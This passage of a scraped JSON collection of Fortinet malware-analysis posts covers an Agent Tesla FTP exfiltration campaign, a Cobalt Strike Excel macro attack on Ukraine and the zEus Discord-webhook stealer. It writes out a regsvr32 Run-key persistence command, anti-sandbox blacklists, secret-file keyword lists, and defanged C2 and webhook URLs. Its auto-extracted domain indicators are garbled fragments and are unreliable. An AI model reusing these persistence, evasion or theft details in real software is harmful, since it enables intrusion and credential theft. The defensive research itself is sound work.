global-messages-db.sqlite. It is an SQLite database that stores an index of all messages, including attachments, BCC and CC emails, folder names, and more. Agent Tesla extracts all contacts (email addresses) from such files. Based on my analysis, this variant disabled some features (some switch variables are set to “false” by default.), such as the keylogger, the screen logger, the system clipboard logger, and cookies. Refer to Figure 14 for details. Agent Tesla also collects information about the victim’s computer, such as the system date and time, login user name, computer name, public IP address, OS full name, CPU information, and RAM capacity. In the past, we captured many Agent Tesla variants that used HTTP POST and SMTP to submit their stolen data to their C2 server. This variant uses a new way to submit the data it collects from the victim’s device over the FTP protocol. The FTP server address and its credentials are plaintext strings held in some global variables. Figure 15 is a screenshot of Agent Tesla about to submit s credentials stolen from my test machine using the FTP method “STOR.” The format of the file name on the FTP is in “PW_{User name-Computer name_System Data&Time}.html”; the content is the stolen data in HTML format. The collected email contacts are in a txt file named “Contacts_Thunderbird.txt_{User name-Computer name_System Data&Time}.txt”. One example on my test machine is “Contacts_Thunderbird.txt_Bobs-BOBS-PC_2024_05_17_17_34_21.txt”. The txt file contains all the email addresses collected from Thunderbird. In this analysis, I went through the entire process of the Agent Tesla campaign targeting Spanish-speaking people. The flowchart in Figure 16 outlines this complex malicious campaign, detailing the process from the phishing email to the stolen information being submitted to an FTP server. We also examined how it uses multiple techniques to escape researcher analysis, such as exploiting two Microsoft vulnerabilities carried by Excel, RTF documents, executing JavaScript and PowerShell scripts, and encoding most downloaded files in base64. Next, we looked at how the fileless loader-module is called to download the Agent Tesla executable and run it in a process-hollowed AddInProcess.exe process. I then elaborated on how Agent Tesla detects whether it’s running in an analysis environment, like sandboxes, virtual machines, etc., or where there is AV software running, like Avast, Comodo, etc. We then looked at the functions this variant can perform on the victim’s device. It collects saved credentials from over 80 popular software applications and victim email contacts from Thunderbird profile files. Finally, you learned how this Agent Tesla variant submits the sensitive data it has harvested from the victim’s device to an FTP server using the “STOR” method. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail recognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions provides advanced protection against both known and unknown phishing attempts. FortiGuard Antivirus service detects the attached Excel document, the downloaded RTF document, and the Agent Tesla executable file with the following AV signatures. MSExcel/CVE_2017_0199. DDOC!exploit MSOffice/CVE_2017_11882. B!exploit MSIL/AgentTesla. B!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious Equation data inside the Excel document. You can also view FortiGuard Labs' previously released outbreak alert on Agent Teslahere. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps[:]//ilang[.]in/QqBbmc hxxp[:]//equalizerrr[.]duckdns[.]org/eveningdatingforeveryone.js hxxp[:]//equalizerrr[.]duckdns[.]org/droidbase64controlfire.txt hxxps[:]//paste[.]ee/d/yWWXG hxxps[:]//uploaddeimagens[.]com[.]br/images/004/773/812/original/js.jpg?1713882778 ftp[.]fosna.net [transferencia_swift_87647574684.xla] 8406A1D7A33B3549DD44F551E5A68392F85B5EF9CF8F9F3DB68BD7E02D1EABA7 [RTF document] 208AF8E2754A3E55A64796B29EF3A625D89A357C59C43D0FF4D2D30E20092D74 [The loader-module] 7230CC614270DCA79415B0CF53A666A219BEB4BEED90C85A1AC09F082AEA613B [Agent Tesla Executable] A1475A0042FE86E50531BB8B8182F9E27A3A61F204700F42FD26406C3BDEC862 spanish,Agent Tesla FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/new-agent-tesla-campaign-targeting-spanish-speaking-people",
      "scraped_at": "2025-07-20T13:47:46.841605",
      "indicators": {
        "ip_address": [],
        "domain": [
          "roidbase64controlfire",
          "osna",
          "veningdatingforeveryone",
          "uckdns",
          "ddInProcess",
          "e",
          "Script",
          "orningdatingroses",
          "lobal-messages-db",
          "s",
          "ddInProcess32",
          "aparicos",
          "owershell"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "7230CC614270DCA79415B0CF53A666A219BEB4BEED90C85A1AC09F082AEA613B",
          "8406A1D7A33B3549DD44F551E5A68392F85B5EF9CF8F9F3DB68BD7E02D1EABA7",
          "A1475A0042FE86E50531BB8B8182F9E27A3A61F204700F42FD26406C3BDEC862",
          "208AF8E2754A3E55A64796B29EF3A625D89A357C59C43D0FF4D2D30E20092D74"
        ],
        "cve": [
          "CVE-2017-11882",
          "CVE-2017-0199"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.34722222222222227
    }
  },
  {
    "id": "Fortinet_56720",
    "source": "Fortinet",
    "title": "Menace Unleashed: Excel File Deploys Cobalt Strike at Ukraine",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Compromised machines are under the control of the threat actorSeverity Level:High FortiGuard Labs has recently identified a sophisticated cyberattack involving an Excel file embedded with a VBA macro designed to deploy a DLL file. The attacker uses a multi-stage malware strategy to deliver the notorious \"Cobalt Strike\" payload and establish communication with a command and control (C2) server. This attack employs various evasion techniques to ensure successful payload delivery. Over the past few years, Ukraine has been a significant target due to its geopolitical situation. The history of these attacks reveals a pattern of increasing complexity and frequency, particularly during periods of geopolitical tension. For instance, in 2022,FortiGuard Labsreported a campaign using a malicious Excel document themed around the Ukrainian military to deliver a multi-stage Cobalt Strike loader. In 2023,Ukraine’s Computer Emergency Response Team (CERT-UA)disclosed that UAC-0057 was involved in an attack using a malicious XLS file containing a macro and a lure image to deploy PicassoLoader and Cobalt Strike Beacon on compromised systems. In this article, we will explore the technical details of this latest multi-stage attack. The malicious Excel document contains elements in Ukrainian designed to lure the user into enabling its macros. Once the VBA macro is enabled, the document switches to sheets related to the calculation of the “amount of budget funds allocated to military units” (translated from “обсягу бюджетних коштів, що спрямовуються до військових частин”). The primary function of the VBA macro is to deploy a DLL downloader, which is encoded in HEX. Additionally, most of the strings in the VBA code are HEX-encoded to evade basic string detection mechanisms. After dropping the DLL file “Ac83faafb23919Ae9. DLl” into “%APPDATA%\\VIBErpc\\bIn\\biN,” the macro creates a shortcut named “ACtIVePRObE” in “%APPDATA%\\Microsoft.” It then uses the “Shell” command to execute “RunDLL32. EXE shell32.dll,ShellExec_RunDLL '%APPDATA%\\Microsoft\\ACtIVePRObE.lnk', 0.” This LNK file is designed to calls regsvr32 to execute the DLL file “Ac83faafb23919Ae9. DLl.” The downloader “Ac83faafb23919Ae9. DLl.” is obfuscated with ConfuserEx. First, it examines process names for specific strings: “processhacker,” “avastui,” “aswtoolssvc,” “wsc_proxy,” “procexp,” “overseer,” and “avastsvc.” If it detects a matching process associated with an analysis tool or antivirus software, it terminates the program. Once passing the process checking, it constructs a web request to get the next stage payload from the URL “hxxps://goudieelectric[.]shop/cms/svg/6364.2809640e[.]chunk.svg.” It can only download the required file if the device is located in Ukraine. It then extracts the base64 encoded data in the section that starts with “href=” and XOR it with the hard-coded array. It then generates a random file name and saves the decoded data to the TEMP folder. It then executes the decoded file using “rundll32.exe,” followed by a sleep command to wait for the execution to finish. Once completed, it deletes the decoded file to remove any traces. The decoded data is also a . NET DLL file tasked with decrypting the file for the next stage and establishing persistence. Next, it checks if the targeted file exists. If not, it creates the file “C:\\ProgramData\\Windows\\Containers\\BaseImages\\9cb03978-56d9-4f38-8f05-d1fdf135f0ab\\Files\\Windows\\System32\\ResetEngine.dll.” It then uses the hard-coded key to decrypt the data using an RC4 algorithm and writes the data to the newly created file. It then adds the registry value “C:\\Windows\\System32\\regsvr32.exe /s C:\\ProgramData\\Windows\\Containers\\BaseImages\\9cb03978-56d9-4f38-8f05-d1fdf135f0ab\\Files\\Windows\\System32\\ResetEngine.dll” into “SOFTWARE\\Microsoft\\Widows\\CurrentVersion\\Run” for persistence and uses InvokeMethod with “Create” to execute the command in the registry. The file “ResetEngine.dll” serves as the core component for decrypting and injecting the final payload. It uses “NtDelayExecution” to evade the detection of malicious activities within sandboxes. It then iterates to inspect processes and attempts to terminate the parent process, if any, in order to implement its anti-debugging measures. After the evade detection process is complete, it decrypts the final payload with an AES algorithm. After decryption, it injects the decrypted data into itself and employs various APIs, including “GetCurrentProcessId,” “OpenProcess,” “VirtualAllocEx,” “WriteProcessMemory,” “CreateRemoteThread,” and “WaitForSingleObject” to execute the final Cobalt Strike. The configuration extraction process involves XOR-ing with 0x2E, allowing us to decipher the information hidden within. By extracting and parsing the configuration, we unveiled the Beacon’s Cobalt Strike Team Server’s (C2) URLs: “hxxps://simonandschuster[.]shop/the-zero-residual-concept/products” and “hxxps://simonandschuster[.]shop/the-zero-residual-concept/sjj-solutions.” In this sophisticated attack, the assailant employs multi-stage malware tactics to thwart detection while ensuring operational stability. By implementing location-based checks during payload downloads, the attacker aims to mask suspicious activity, potentially eluding scrutiny by analysts. Leveraging encoded strings, the VBA conceals crucial import strings, facilitating the deployment of DLL files for persistence and decrypting subsequent payloads. Furthermore, the self-deletion feature aids evasion tactics, while the DLL injector employs delaying tactics and terminates parent processes to evade sandboxing and anti-debugging mechanisms, respectively. These orchestrated maneuvers converge towards the deployment of Cobalt Strike onto targeted endpoints, particularly within the confines of Ukraine's geopolitical landscape. As Office documents provide troves of functionality, including numerous plugins and scripts, users must exercise utmost caution when handling files sourced from dubious origins. Vigilance is paramount, particularly regarding any suspicious file drops or unfamiliar startup programs within registry settings. The malware described in this report is detected and blocked byFortiGuard Antivirusas: VBA/Agent. APO!trW32/Injector. S!trMSIL/Agent. QTS!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. goudieelectric[.]shop simonandschuster[.]shop 88c97af92688d03601e4687b290d4d7f9f29492612e29f714f26a9278c6eda5b 815c1571356cf328a18e0b1f3779d52e5ba11e5e4aac2d216b79bb387963c2be 9649d58a220ed2b4474a37d6eac5f055e696769f87baf58b1d3d0b5da69cbce5 af8104e567c6d614547acb36322ad2ed6469537cd1d78ae1be65fbde1d578abc de1bceb00c23e468f4f49a79ec69ec8ad3ed622a3ffc08f84c0481ad0f6f592b 6f4642a203541426d504608eed7927718207f29be2922a4c9aa7e022f22e0deb d90f6e12a917ba42f7604362fafc4e74ed3ce3ffca41ed5d3456de28b2d144bf d9b16f077cd6e00137ba208031d22fd6423d0ef303883ad4b6f78638693f2044 excel,ukraine,Cobalt Strike FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/menace-unleashed-excel-file-deploys-cobalt-strike-at-ukraine",
      "scraped_at": "2025-07-20T13:47:55.547332",
      "indicators": {
        "ip_address": [],
        "domain": [
          "hell32",
          "hunk",
          "CtIVePRObE",
          "undll32",
          "egsvr32",
          "esetEngine"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "af8104e567c6d614547acb36322ad2ed6469537cd1d78ae1be65fbde1d578abc",
          "d9b16f077cd6e00137ba208031d22fd6423d0ef303883ad4b6f78638693f2044",
          "88c97af92688d03601e4687b290d4d7f9f29492612e29f714f26a9278c6eda5b",
          "9649d58a220ed2b4474a37d6eac5f055e696769f87baf58b1d3d0b5da69cbce5",
          "815c1571356cf328a18e0b1f3779d52e5ba11e5e4aac2d216b79bb387963c2be",
          "6f4642a203541426d504608eed7927718207f29be2922a4c9aa7e022f22e0deb",
          "d90f6e12a917ba42f7604362fafc4e74ed3ce3ffca41ed5d3456de28b2d144bf",
          "de1bceb00c23e468f4f49a79ec69ec8ad3ed622a3ffc08f84c0481ad0f6f592b"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4442250740375123
    }
  },
  {
    "id": "Fortinet_88360",
    "source": "Fortinet",
    "title": "zEus Stealer Distributed via Crafted Minecraft Source Pack",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High Many game makers allow users to alter a game's appearance or behavior to increase its enjoyment and replay value. Players can often also download packages created by others. However, this is also a chance for attackers to distribute their malware. This article examines a batch stealer distributed via a crafted Minecraft source pack. The zEus stealer malware has been added to a source pack that was being shared on YouTube. The name—zEus—is from a previous variant of this malware. The variant (d9d394cc2a743c0147f7c536cbb11d6ea070f2618a12e7cc0b15816307808b8a) is also distributed via a Minecraft source pack, but it’s embedded in a WinRAR self-extract file. The self-extract file mimics a Windows screensaver file. It runs the stealer and opens the image used as a file icon. It’s an image from the Internet with the string “zEus” added. This name is also found in a profile of the Discord webhook receiving stolen data. When a victim executes the zEus stealer, it checks whether it is being analyzed. If not, it collects sensitive information and drops script files to make the attack more flexible. The zEus stealer creates folders in C:\\ProgramData to save stolen data and malicious script files. zEus checks whether it is being analyzed by comparing the computer name and currently running processes with blacklists. Computer name blacklist: WDAGUtilityAccount, Abby, Peter, Wilson, hmarc, patex, JOHN-PC, RDhJ0CNFevzX, kEecfMwgj, Frank, 8Nl0ColNQ5bq, Lisa, John, george, PxmdUOpVyx, 8VizSM, w0fjuOVmCcP5A, lmVwjj9b, PqONjHVwexsS, 3u2v9m8, Julia, HEUeRzl, BEE7370C-8C0C-4, DESKTOP-NAKFFMT, WIN-5E07COS9ALR, B30F0242-1C6A-4, DESKTOP-VRSQLAG, Q9IATRKPRH, XC64ZB, DESKTOP-D019GDM, DESKTOP-WI8CLET, SERVER1, LISA-PC, JOHN-PC, DESKTOP-B0T93D6, DESKTOP-1PYKP29, DESKTOP-1Y2433R, WILEYPC, WORK, 6C4E733F-C2D9-4, RALPHS-PC, DESKTOP-WG3MYJS, DESKTOP-7XC6GEZ, DESKTOP-5OV9S0O, QarZhrdBpj, ORELEEPC, ARCHIBALDPC, JULIA-PC, d1bnJkfVlH, QDAVNJRH Program blacklist: httpdebuggerui, wireshark, fiddler, vboxservice, df5serv, processhacker, vboxtray, vmtoolsd, vmwaretray, ida64, ollydbg, pestudio, vmwareuser, vgauthservice, vmacthlp, x96dbg, vmsrvc, x32dbg, vmusrvc, prl_cc, prl_tools, xenservice, qemu-ga, joeboxcontrol, ksdumperclient, ksdumper, joeboxserver The zEus stealer grabs a wide range of information. It creates individual text files for each piece of information and saves them to corresponding folders. The folders for stolen information are in C: \\ProgramData\\STEALER, including the PCINFO, IPINFO, HARDWARE, BROWSERS, STEAL, LDB, and SESSION folders. This folder contains two folders: IPINFO and HARDWARE. zEus looks up the victim’s IP address and related details using the online tools My External IP, ipapi, and ip-api. The results are saved as text files in the IPINFO folder. Using the IP address, zEus queries for further information from the tools, including the internet service provider, location details such as city, longitude, and latitude, and postal code. In addition, it collects the status of whether the victim is using a proxy server and if a mobile network is being used. Next, zEus uses command-line utilities and PowerShell to collect hardware information and saves the results in the HARDWARE folder, including currently running processes, OS version, product key, hardware ID, system configuration, installed programs, and WIFI password. zEus copies files for login data and user preferences from the browsers’ profile path and stores them in corresponding folders. Below are the target browsers: Chrome, Opera, Brave, Vivaldi, Edge, Firefox From these browsers, it grabs files for login data and an encryption key for a password (if necessary). It then steals cookies, history, shortcuts, and bookmarks. This folder contains login data copied from the following software: Steam, osu!, Roblox, Growtopia, Discord The files are mostly copied from the software’s data path. In addition, zEus also searches for discord_backup_codes.txt in the Downloads folder. Discord_backup_codes.txt contains backup code that helps users log in when they lose their devices for multi-factor authentication (MFA). As a result, the zEus stealer tries to get the backup code from a default location for downloaded files. The LDB folder only stores .ldb files copied from %appdata%\\discord\\Local Storage\\leveldb. From these .ldb files, the attacker can extract Discord tokens containing account and password information and then log into the victim’s account. zEus also copies various data from the following path to the SESSION folder. Not only do these files contain credentials, but the attacker also collects information about the victim. For example, it copies the Logs folders from the parent folder of EpicGamesLauncher, which contains debug logs about EpicGamesLauncher. Additionally, it copies the parent folders of game companies like Battle.net and Electronic Art. With this knowledge, the attacker can know which games are popular with the victim and how to disguise the malware to achieve the next attack. %appdata%\\Battle.netExclude strings: BrowserCache, Cache Electronic Arts %localappdata%\\Electronic Arts %localappdata%\\EpicGamesLauncher\\Saved\\Config%localappdata%\\EpicGamesLauncher\\Saved\\Data%localappdata%\\EpicGamesLauncher\\Saved\\Logs %appdata%\\Telegram Desktop\\tdataExclude strings: config, dumps, tdummy, emoji, user_data, webview, *.json %userprofile%\\.lunarclient\\settings\\game\\*.json%appdata%\\.minecraft\\*.json %localappdata%\\protonvpn %localappdata%\\Ubisoft Game Launcher zEus stealer also drops KEYWORDSEARCHER.bat and Keyword.txt to the STEALER folder. The batch file helps users search for keywords they want in a folder, and the text file is its README. After data collection, the STEALER folder is compressed into a zip file—STEALER.zip—and deleted. KEYWORDSEARCHER.bat and Keyword.txt are not used by the zEus stealer. Finally, zEus organizes the attack result and sends it with STEALER.zip attached. The result shows whether it has successfully stolen the items that should be in the STEALER folder, along with the following information: Execution date, user name, computer name, processor, anti-virus software, clipboard content, installed XBOX games, cryptocurrencies, sensitive files zEus stealer also checks whether the victim uses any of the following cryptocurrencies: Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, AtomicWallet, Guarda, Coinomi It also searches the Downloads folder for files whose names contain one of the following keywords: 2fa, mdp, motdepasse, mot_de_passe, login, seed, key, data, db, password, secret, account, acount, paypal, banque, metamask, wallet, code, exodus, memo, compte, token, backup, recovery These keywords are related to login mechanisms, such as 2FA (two-factor authentication), seed, and key. There are also some French keywords meaning password, bank, and account. Apart from information stealing, there are features performed by the script files that are dropped to C:\\ProgramData\\{ComputerName}: Kill Task Manager debugerkiller.bat Send Screenshot Screen Lock SYSTEMLOCK.bat, configSYSLOCK.vbs, bsod.hta CHATBOX.bat C2 Communication RAT.bat, COMMANDS.txt, HISTORY.txt Among these files, debugerkiller.bat, Screen.bat, and RAT.bat are executed immediately, and their paths are registered under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run to achieve persistence. To avoid suspicion, the names of Windows system files and folders are used as the value name. zEus stealer drops debugerkiller.bat and obscures its execution to keep terminating Task Manager. This is set to auto-run to ensure the screen lock mechanism works. zEus drops Screen.bat to keep sending a screenshot to the webhook every five seconds. This is executed automatically at startup to keep monitoring the victim’s computer. SYSTEMLOCK.bat and configSYSLOCK.vbs are dropped to perform this task. configSYSLOCK.vbs is the launcher for SYSTEMLOCK.bat. The attacker can execute configSYSLOCK.vbs via C2 communication. SYSTEMLOCK.bat pops up a message box telling the victim not to restart the computer and closes explorer.exe to stop the victim from interacting with most Windows items. The SYSTEMLOCK.bat then keeps executing bsod.hta, which it dropped to the ProgramData folder. This HTA file just shows a full-screen blank window. However, debugkiller.bat prevents the victim from opening Task Manager, so most well-known methods to stop a program are blocked. CHATBOX.bat is dropped to allow the victim to send at most five sentences to the attacker. This can be executed via C2 communication. zEus stealer drops RAT.bat to build C2 communication. RAT.bat downloads command-line instructions from onlinecontroler[.]000webhostapp[.]com to COMMANDS.txt. If the instruction is not duplicated, it will be executed, and the result will be written to HISTORY.txt later. The executed instruction is sent to the attack’s webhook to show the current situation. In addition, special messages for screen lock and chat box help the attacker with troubleshooting. RAT.bat is set to auto-run to continuously control the computer. zEus stealer has a relatively simple attack flow, but it collects a wide variety of information that provides data for the next attack and contributes to social engineering. This is a reminder about the dangers of downloading and using files from an unknown source. Even a source pack, usually loaded by the software, can be a carrier for malware. In addition to only downloading files from reputable sources and checking reviews of a file and author, FortiGuard Labs recommends enabling MFA as an additional protection layer. MFA prevents unauthorized account access if a password has been compromised and can also alert users to unusual account activities. We also recommend subscribing to a service like FortiRecon that automatically scans the web for leaked data. The malware described in this report is detected and blocked by FortiGuard Antivirus as: BAT/Agent. DI!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. FortiGuard IP Reputation and Anti-Botnet Security services proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. FortiRecon is a SaaS-based Digital Risk Prevention service backed by FortiGuard Labs cybersecurity experts. It scans the dark web to provide timely threat intelligence on threat actor activity, including leaked data, so organizations can respond rapidly to and shut down active threats. It can also detect evidence of attacks in progress and provide critical information about threat actor motivations and TTPs. If you believe this or any other cybersecurity threat has impacted your organization, please contact our Global FortiGuard Incident Response Team. onlinecontroler[.]000webhostapp[.]com/ panel-controller[.]000webhostapp[.]com/ hxxps[:]//discord[.]com/api/webhooks/1212818346157015070/2v0xe2vrxFGv65MRE9qvICmsJw-5e_pq_28xscGybiY1ScEyEiSKMC_zFffr3KkuAimX hxxps[:]//discord[.]com/api/webhooks/1212821302671581224/L30ylYucowXO_rm7sUpdwA8DLbYet6NyvUsNV60EP1o1HnF-2M-UPsvatVGQY0ctO9Vk hxxps[:]//discord[.]com/api/webhooks/1212818346157015070/2v0xe2vrxFGv65MRE9qvICmsJw-5e_pq_28xscGybiY1ScEyEiSKMC_zFffr3KkuAimX hxxps[:]//discord[.]com/api/webhooks/1212821302671581224/L30ylYucowXO_rm7sUpdwA8DLbYet6NyvUsNV60EP1o1HnF-2M-UPsvatVGQY0ctO9Vk hxxps[:]//discord[.]com/api/webhooks/1212818346157015070/2v0xe2vrxFGv65MRE9qvICmsJw-5e_pq_28xscGybiY1ScEyEiSKMC_zFffr3KkuAimX hxxps[:]//discord[.]com/api/webhooks/1216834085205311708/2Rx-yUIHeCnuhuLskpz25Ghf-YWeP6Si6oiUSN4SMQYNkeJfVJiYNC4Xy_Oj0ZNQ1qTC hxxps[:]//discord[.]com/api/webhooks/1117543783714787458/U_DdPjJm7rM7Q2asPiMISLTrbd3oGw3oVQ25_XU37HCmM6QIQ804SJAH4_h0AT2Vr_cv hxxps[:]//discord[.]com/api/webhooks/1191890861622050848/iJVVE3x3xilf4TeZNiERydXZPF5TRE1UhM4Ew06uHn95b0k0KDViw3YnhdynrXn17OKa hxxps[:]//discord[.]com/api/webhooks/1215746939635892344/CmKTGdIvizEpR4FgvvLJm3Bcbjg3AKlNGlwd2S-yIO-GRBXZZbn0OwG39kKnx7mDur4T hxxps[:]//discord[.]com/api/webhooks/1223978005127364659/3E0hHtDqDOHQJBaG8ifspilk2mY8E1s4KeQY36inBq-tq5q6aZex8U0YJVxVlloFJj5X hxxps[:]//discord[.]com/api/webhooks/1224075124005929020/kA4IFZrIXBl_d1Y4I0sMHhF1cZzXvC-yEo5HzSk6Jzq_I0k1PCc1idn4FmqSC2UMljdD aabfbef31ab073d99c01ecae697f66bbf6f14aa5d9c295c7a6a548879381fb24 c9687714cf799e5ce9083c9afa3e622c978136d339fc9c15e272b0df9cd7e21c d9d394cc2a743c0147f7c536cbb11d6ea070f2618a12e7cc0b15816307808b8a c2c8a7050b28d86143f4d606a6d245b53c588bc547a639094fce857962246da4 be9ea302bcfb52fbfdf006b2df8357388cd4c078059aabc5b5928676c3361e50 9d3409852348caa65d28e674008dd6bb986eed4fb507957c7a8b73a41e00be70 b6e8b612e99c54dd98af1756f7c9b8a8c19e31ed9b2836878c2a5144563ff1b2 8a2f6d5f6cf7d1a7534454e3c3007337b71d7da470e86f7636eb02d68b2db8cc df6156fdbbcc7b6f8c9cb4c5c1b0018fc3f1e1ca7d949b5538ec27dc86d026a4 5840f3e43a0c635be94b5fbf2e300d727545371b582361a52682b4a9e08bcebd 51ede75315d858209f9aa60d791c097c18d38f44b9d050b555ff1f4de0ae672d d1865d2aaf11e3f8bccefe9c4847510234f14aaa5378ce9e8e97553537cf2ca1 9ba19d614af029c3c198b576ccdf1de87d80ac14b12103e8a15376229a2a7860 6063c8285e13d10eabbe363e2ab0d8748bcd595b470698e0cffee31ba255a566 d1a18b436f947611914ced09e4465b49807cec4f3a62b0973c9017b6d82c9f70 1cdd580176eeb4342a0333b50454da061e473358274e6e543df1411186c12042 ed59a797521db06abdf4c88dad7b1666e5978aaa6670a5952a55b7e11f7b790e 2ceae724f0e96e2d8c47296dd1e73ac592e22ee3288eabf11c8d039c6d6d4f8b 03983b56d8b1a6cc43109f6cd67a13666367595a2ea07766127cb1fe4d4bb1a5 9940da9d02d29489c3e26d27feb15b6f4bbf49547b962592125441917c952f12 fbf967295dac00f1e9cb67e9a40b6729b003dd12cf022eb15d626df09716442d 4e0a96ab28570936d095ac3910dcd239c7ceeb2b38a070468404584f8b902dd1 20009fd157a898ad6d50fae6b8127056c5b1f50e31f90f01d2e6c13e6b4c38f8 info stealer malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/zeus-stealer-distributed-via-crafted-minecraft-source-pack",
      "scraped_at": "2025-07-20T13:48:03.712468",
      "indicators": {
        "ip_address": [],
        "domain": [
          "eyword",
          "onfigSYSLOCK",
          "ebugerkiller",
          "YSTEMLOCK",
          "AT",
          "OMMANDS",
          "EYWORDSEARCHER",
          "ebugkiller",
          "HATBOX",
          "sod",
          "creen",
          "attle",
          "xplorer",
          "ISTORY",
          "TEALER"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "b6e8b612e99c54dd98af1756f7c9b8a8c19e31ed9b2836878c2a5144563ff1b2",
          "1cdd580176eeb4342a0333b50454da061e473358274e6e543df1411186c12042",
          "03983b56d8b1a6cc43109f6cd67a13666367595a2ea07766127cb1fe4d4bb1a5",
          "d9d394cc2a743c0147f7c536cbb11d6ea070f2618a12e7cc0b15816307808b8a",
          "20009fd157a898ad6d50fae6b8127056c5b1f50e31f90f01d2e6c13e6b4c38f8",
          "9ba19d614af029c3c198b576ccdf1de87d80ac14b12103e8a15376229a2a7860",
          "d1865d2aaf11e3f8bccefe9c4847510234f14aaa5378ce9e8e97553537cf2ca1",
          "8a2f6d5f6cf7d1a7534454e3c3007337b71d7da470e86f7636eb02d68b2db8cc",
          "6063c8285e13d10eabbe363e2ab0d8748bcd595b470698e0cffee31ba255a566",
          "c2c8a7050b28d86143f4d606a6d245b53c588bc547a639094fce857962246da4",
          "c9687714cf799e5ce9083c9afa3e622c978136d339fc9c15e272b0df9cd7e21c",
          "51ede75315d858209f9aa60d791c097c18d38f44b9d050b555ff1f4de0ae672d",
          "4e0a96ab28570936d095ac3910dcd239c7ceeb2b38a070468404584f8b902dd1",
          "9d3409852348caa65d28e674008dd6bb986eed4fb507957c7a8b73a41e00be70",
          "fbf967295dac00f1e9cb67e9a40b6729b003dd12cf022eb15d626df09716442d",
          "5840f3e43a0c635be94b5fbf2e300d727545371b582361a52682b4a9e08bcebd",
          "9940da9d02d29489c3e26d27feb15b6f4bbf49547b962592125441917c952f12",
          "be9ea302bcfb52fbfdf006b2df8357388cd4c078059aabc5b5928676c3361e50",
          "df6156fdbbcc7b6f8c9cb4c5c1b0018fc3f1e1ca7d949b5538ec27dc86d026a4",
          "aabfbef31ab073d99c01ecae697f66bbf6f14aa5d9c295c7a6a548879381fb24",
          "2ceae724f0e96e2d8c47296dd1e73ac592e22ee3288eabf11c8d039c6d6d4f8b",
          "d1a18b436f947611914ced09e4465b49807cec4f3a62b0973c9017b6d82c9f70",
          "ed59a797521db06abdf4c88dad7b1666e5978aaa6670a5952a55b7e11f7b790e"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6323620582765035
    }
  },
  {
    "id": "Fortinet_42323",
    "source": "Fortinet",
    "title": "Key Findings from the 2H 2023 FortiGuard Labs Threat Report",
    "text": "FortiGuard Labs Threat Research In the second half of 2023, the cybersecurity landscape experienced various significant developments—like the rise in sophisticated attacks targeting large-scale enterprises and critical industries—that impact every organization. In our2H 2023 Threat Landscape Report, we examine the cyberthreat landscape over the year’s second half to identify trends and offer insights on what security professionals should know to effectively protect their organizations. The report findings are based on the collective intelligence ofFortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed worldwide during this same period. Below are key takeaways from the report. During this period, we observed substantial activity among APT groups, more targeted ransomware attacks, new botnets and malware strains, and an uptick in IoT exploits. We’re seeing a continued trend of threat actors reusing “old” attacks, underscoring the importance of security practitioners remaining vigilant, as attackers aren’t likely to stop exploiting older vulnerabilities. Notably, adversaries are moving quicker than ever, exploiting new vulnerabilities 43% faster than in the first half of the year. This finding underscores the need for organizations to improve their patch management processes, ensuring that they’re updating software regularly to protect against fast-moving adversaries. Vendors also play a vital role in enabling customers to mitigate vulnerability risk. Every vendor has a responsibility to dedicate themselves to radical transparency, introducing robust security scrutiny at all stages of the product development lifecycle and proactively 